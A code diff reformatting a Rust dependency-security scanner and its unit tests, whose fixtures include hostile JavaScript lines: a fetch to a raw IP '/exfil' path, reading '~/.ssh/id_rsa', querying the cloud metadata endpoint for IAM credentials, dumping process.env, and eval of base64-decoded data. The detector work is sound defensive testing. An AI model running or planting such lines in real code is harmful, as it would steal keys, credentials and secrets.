@@ -290,11 +290,15 @@ impl Check for PatternsCheck {
 
                             let snippet = truncate_line(line, 80);
                             findings.push(
-                                Finding::new(rule.rule_id, rule.severity, format!("{}: {snippet}", rule.description))
-                                    .with_file(&rel_path, line_num + 1)
-                                    .with_confidence(rule.confidence)
-                                    .with_suggestion(rule.suggestion)
-                                    .with_package(extract_package_name(&rel_path)),
+                                Finding::new(
+                                    rule.rule_id,
+                                    rule.severity,
+                                    format!("{}: {snippet}", rule.description),
+                                )
+                                .with_file(&rel_path, line_num + 1)
+                                .with_confidence(rule.confidence)
+                                .with_suggestion(rule.suggestion)
+                                .with_package(extract_package_name(&rel_path)),
                             );
                         }
                     }
@@ -581,13 +585,20 @@ fn check_install_scripts(root: &Path, findings: &mut Vec<Finding>) {
 
             if suspicious_patterns.is_match(script_value) {
                 findings.push(
-                    Finding::new("DEPSEC-P012", Severity::High, format!(
-                        "Install script '{}' executes suspicious command: {}",
-                        hook, truncate_line(script_value, 60)
-                    ))
-                        .with_file_only("package.json")
-                        .with_confidence(Confidence::High)
-                        .with_suggestion(format!("Review the '{hook}' script — install scripts are a common attack vector")),
+                    Finding::new(
+                        "DEPSEC-P012",
+                        Severity::High,
+                        format!(
+                            "Install script '{}' executes suspicious command: {}",
+                            hook,
+                            truncate_line(script_value, 60)
+                        ),
+                    )
+                    .with_file_only("package.json")
+                    .with_confidence(Confidence::High)
+                    .with_suggestion(format!(
+                        "Review the '{hook}' script — install scripts are a common attack vector"
+                    )),
                 );
             }
         }
@@ -743,16 +754,29 @@ mod tests {
     fn test_scan_detects_eval_exec() {
         // P002: base64 decode → execute chain
         let (dir, config) = setup_dep_file("var x = atob(data); eval(x);");
-        let ctx = ScanContext { root: dir.path(), config: &config };
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
         let result = PatternsCheck.run(&ctx).unwrap();
-        assert!(result.findings.iter().any(|f| f.rule_id == "DEPSEC-P002"),
-            "Expected P002 finding, got: {:?}", result.findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>());
+        assert!(
+            result.findings.iter().any(|f| f.rule_id == "DEPSEC-P002"),
+            "Expected P002 finding, got: {:?}",
+            result
+                .findings
+                .iter()
+                .map(|f| &f.rule_id)
+                .collect::<Vec<_>>()
+        );
     }
 
     #[test]
     fn test_scan_detects_raw_ip() {
         let (dir, config) = setup_dep_file("fetch('http://83.142.209.203:8080/exfil');");
-        let ctx = ScanContext { root: dir.path(), config: &config };
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
         let result = PatternsCheck.run(&ctx).unwrap();
         assert!(result.findings.iter().any(|f| f.rule_id == "DEPSEC-P003"));
     }
@@ -761,16 +785,31 @@ mod tests {
     fn test_scan_detects_credential_harvest() {
         // P004: readFile targeting ~/.ssh
         let (dir, config) = setup_dep_file("readFile('~/.ssh/id_rsa');");
-        let ctx = ScanContext { root: dir.path(), config: &config };
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
         let result = PatternsCheck.run(&ctx).unwrap();
-        assert!(result.findings.iter().any(|f| f.rule_id == "DEPSEC-P004"),
-            "Expected P004, got: {:?}", result.findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>());
+        assert!(
+            result.findings.iter().any(|f| f.rule_id == "DEPSEC-P004"),
+            "Expected P004, got: {:?}",
+            result
+                .findings
+                .iter()
+                .map(|f| &f.rule_id)
+                .collect::<Vec<_>>()
+        );
     }
 
     #[test]
     fn test_scan_detects_imds() {
-        let (dir, config) = setup_dep_file("curl('http://169.254.169.254/latest/meta-data/iam/security-credentials/');");
-        let ctx = ScanContext { root: dir.path(), config: &config };
+        let (dir, config) = setup_dep_file(
+            "curl('http://169.254.169.254/latest/meta-data/iam/security-credentials/');",
+        );
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
         let result = PatternsCheck.run(&ctx).unwrap();
         assert!(result.findings.iter().any(|f| f.rule_id == "DEPSEC-P010"));
     }
@@ -778,7 +817,10 @@ mod tests {
     #[test]
     fn test_scan_detects_env_exfil() {
         let (dir, config) = setup_dep_file("JSON.stringify(process.env);");
-        let ctx = ScanContext { root: dir.path(), config: &config };
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
         let result = PatternsCheck.run(&ctx).unwrap();
         assert!(result.findings.iter().any(|f| f.rule_id == "DEPSEC-P011"));
     }
@@ -786,7 +828,10 @@ mod tests {
     #[test]
     fn test_scan_clean_file_no_findings() {
         let (dir, config) = setup_dep_file("module.exports = function() { return 42; };");
-        let ctx = ScanContext { root: dir.path(), config: &config };
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
         let result = PatternsCheck.run(&ctx).unwrap();
         assert!(result.findings.is_empty());
     }
@@ -795,28 +840,47 @@ mod tests {
     fn test_scan_respects_ignore_rules() {
         let (dir, mut config) = setup_dep_file("fetch('http://83.142.209.203/exfil');");
         config.ignore.patterns = vec!["DEPSEC-P003".into()];
-        let ctx = ScanContext { root: dir.path(), config: &config };
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
         let result = PatternsCheck.run(&ctx).unwrap();
         assert!(!result.findings.iter().any(|f| f.rule_id == "DEPSEC-P003"));
     }
 
     #[test]
     fn test_scan_respects_allow_rules() {
-        let (dir, mut config) = setup_dep_file("const cp = require('child_process');\ncp.exec(cmd);");
-        config.patterns.allow.insert("test-pkg".into(), vec!["DEPSEC-P001".into()]);
-        let ctx = ScanContext { root: dir.path(), config: &config };
+        let (dir, mut config) =
+            setup_dep_file("const cp = require('child_process');\ncp.exec(cmd);");
+        config
+            .patterns
+            .allow
+            .insert("test-pkg".into(), vec!["DEPSEC-P001".into()]);
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
         let result = PatternsCheck.run(&ctx).unwrap();
-        assert!(!result.findings.iter().any(|f| f.rule_id == "DEPSEC-P001" && f.package.as_deref() == Some("test-pkg")));
+        assert!(!result
+            .findings
+            .iter()
+            .any(|f| f.rule_id == "DEPSEC-P001" && f.package.as_deref() == Some("test-pkg")));
     }
 
     #[test]
     fn test_scan_no_dep_dirs() {
         let dir = tempfile::TempDir::new().unwrap();
         let config = Config::default();
-        let ctx = ScanContext { root: dir.path(), config: &config };
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
         let result = PatternsCheck.run(&ctx).unwrap();
         assert!(result.findings.is_empty());
-        assert!(result.pass_messages.iter().any(|m| m.contains("No dependency directories")));
+        assert!(result
+            .pass_messages
+            .iter()
+            .any(|m| m.contains("No dependency directories")));
     }
 
     #[test]
@@ -826,7 +890,10 @@ mod tests {
         std::fs::create_dir_all(&pkg_dir).unwrap();
         std::fs::write(pkg_dir.join("icon.png"), "fake png with eval(bad)").unwrap();
         let config = Config::default();
-        let ctx = ScanContext { root: dir.path(), config: &config };
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
         let result = PatternsCheck.run(&ctx).unwrap();
         // PNG files should be skipped entirely
         assert!(result.findings.is_empty());
@@ -839,7 +906,10 @@ mod tests {
         std::fs::create_dir_all(&pkg_dir).unwrap();
         std::fs::write(pkg_dir.join("bundle.js.map"), "eval(bad)").unwrap();
         let config = Config::default();
-        let ctx = ScanContext { root: dir.path(), config: &config };
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
         let result = PatternsCheck.run(&ctx).unwrap();
         assert!(result.findings.is_empty());
     }
